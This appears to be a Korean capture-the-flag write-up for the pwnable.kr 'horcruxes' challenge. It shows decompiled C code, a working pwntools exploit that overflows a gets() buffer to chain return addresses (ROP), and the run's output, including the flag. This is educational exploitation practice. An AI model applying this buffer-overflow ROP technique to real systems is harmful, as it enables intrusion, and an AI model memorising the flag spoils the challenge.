# 문제
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and ROP it!
author: jiwon choi

ssh horcruxes@pwnable.kr -p2222 (pw:guest)

---  
# 개요  
ROP 문제라고 대 놓고 문제에서 알려주네요 우선 바이너리를 가져와봅시다. 

---
# 분석 
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // ST18_4@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  alarm(0x3Cu);
  hint();
  init_ABCDEFG();
  v3 = seccomp_init(0);
  seccomp_rule_add(v3, 2147418112, 173, 0);
  seccomp_rule_add(v3, 2147418112, 5, 0);
  seccomp_rule_add(v3, 2147418112, 3, 0);
  seccomp_rule_add(v3, 2147418112, 4, 0);
  seccomp_rule_add(v3, 2147418112, 252, 0);
  seccomp_load(v3);
  return ropme();
}
```
위의 코드는 IDA를 통해 본 main 루틴입니다.

여기서 중요한 함수는 init_ABCDEFG()함수와 rompe() 함수입니다.

```c
unsigned int init_ABCDEFG()
{
  int v0; // eax@4
  unsigned int result; // eax@4
  unsigned int buf; // [sp+8h] [bp-10h]@1
  int fd; // [sp+Ch] [bp-Ch]@1

  fd = open("/dev/urandom", 0);
  if ( read(fd, &buf, 4u) != 4 )
  {
    puts("/dev/urandom error");
    exit(0);
  }
  close(fd);
  srand(buf);
  a = 0xDEADBEEF * rand() % 0xCAFEBABE;
  b = 0xDEADBEEF * rand() % 0xCAFEBABE;
  c = 0xDEADBEEF * rand() % 0xCAFEBABE;
  d = 0xDEADBEEF * rand() % 0xCAFEBABE;
  e = 0xDEADBEEF * rand() % 0xCAFEBABE;
  f = 0xDEADBEEF * rand() % 0xCAFEBABE;
  v0 = rand();
  g = 0xDEADBEEF * v0 % 0xCAFEBABE;
  result = f + e + d + c + b + a + 0xDEADBEEF * v0 % 0xCAFEBABE;
  sum = result;
  return result;

```
urandom을 시드로 a ~ g 변수를 각각 랜덤하게 생성합니다.  

result 변수에는 a ~ g 변수의 합이 저장됩니다.  

이후 이 값은 ```rompe()``` 함수에서 씁니다.
```c
printf("Select Menu:");
__isoc99_scanf("%d", &v2);
getchar();
if ( v2 == a )
{
  A();
}
else if ( v2 == b )
{
  B();
}
else if ( v2 == c )
{
  C();
}
else if ( v2 == d )
{
  D();
}
else if ( v2 == e )
{
  E();
}
else if ( v2 == f )
{
  F();
}
else if ( v2 == g )
{
  G();
}
```
v2 == a 를 보고 0xa인줄 알고 괜한 삽질을 했습니다. 아무래도 전역변수 같습니다.

```c
else
{
  printf("How many EXP did you earned? : ");
  gets(s);
  if ( atoi(s) == sum )
  {
    fd = open("flag", 0);
    s[read(fd, s, 0x64u)] = 0;
    puts(s);
    close(fd);
    exit(0);
  }
  puts("You'd better get more experience to kill Voldemort");
}
return 0;
```
G까지 모두 틀리면 위의 루틴을 만나게 됩니다. gets로 입력을 받고 그 값이
a~g 합과 같다면 플래그를 출력합니다.

gets함수를 사용하므로 ret를 덮어서 A() 함수부터 G() 함수까지 차례대로 호출하여 EXP를 파싱하고 더한 후 rompe() 함수를 호출하여 값을 넣어주면 플래그를 출력할 것 같습니다.

```python
from pwn import*

p = remote(0,9032)

print p.recvuntil("Select Menu:")
p.sendline("0")

print p.recvuntil("How many EXP did you earned? : ")

payload = "A"*120
payload += "\x4b\xfe\x09\x08" #a
payload += "\x6a\xfe\x09\x08" #b
payload += "\x89\xfe\x09\x08" #c
payload += "\xa8\xfe\x09\x08" #d
payload += "\xc7\xfe\x09\x08" #e
payload += "\xe6\xfe\x09\x08" #f
payload += "\x05\xff\x09\x08" #g
payload += "\xfc\xff\x09\x08" #rompe

p.sendline(payload)

sum = 0

for i in range(0, 7):
  p.recvuntil('EXP +')
  sum = sum + int(p.recvuntil(')')[:-1])
  print sum

print p.recvuntil("Select Menu:")
p.sendline("0")

print p.recvuntil("How many EXP did you earned? : ")
p.sendline(str(sum))

print p.interactive()
```
```
horcruxes@ubuntu:/tmp$ python exp.py
[+] Opening connection to localhost on port 9032: Done
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and destroy it!

Select Menu:
How many EXP did you earned? :
454574208
-549777161
-1673475767
-1085042747
349691327
777050481
-1270876098

Select Menu:
How many EXP did you earned? :
[*] Switching to interactive mode
Magic_spell_1s_4vad4_K3daVr4!
```
